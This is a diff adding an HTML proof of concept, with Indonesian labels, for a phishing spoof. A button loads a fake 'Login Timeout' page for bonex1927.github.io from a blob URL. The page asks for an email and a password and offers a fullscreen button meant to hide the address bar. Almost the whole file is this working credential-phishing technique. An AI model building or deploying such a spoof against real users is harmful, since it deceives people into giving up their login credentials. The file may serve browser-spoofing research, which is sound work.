@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body style="font-family:sans-serif;padding:20px">
+<h2>PoC COMBO - Blob + Fullscreen Spoof</h2>
+<button onclick="go()" style="padding:15px;width:100%">KLIK UNTUK SERANGAN COMBO</button>
+<script>
+function go(){
+  const fakeLogin = `
+    <div style="font-family:sans-serif;padding:20px">
+    <h2 style="color:red">Login Timeout - bonex1927.github.io</h2>
+    <p>Sesi habis, silakan login lagi:</p>
+    <input placeholder="Email" style="width:100%;padding:10px"><br><br>
+    <input type="password" placeholder="Password" style="width:100%;padding:10px"><br><br>
+    <button style="padding:10px;width:100%;background:blue;color:white">LOGIN</button>
+    <p><small>URL bar masih bonex1927.github.io padahal ini dari blob + fullscreen</small></p>
+    <button onclick="document.documentElement.requestFullscreen()" style="margin-top:20px;width:100%;padding:15px">Masuk Fullscreen (Hilangkan URL)</button>
+    </div>
+  `;
+  const blob = new Blob([fakeLogin], {type:'text/html'});
+  location.href = URL.createObjectURL(blob);
+}
+</script>
+</body>
+</html>
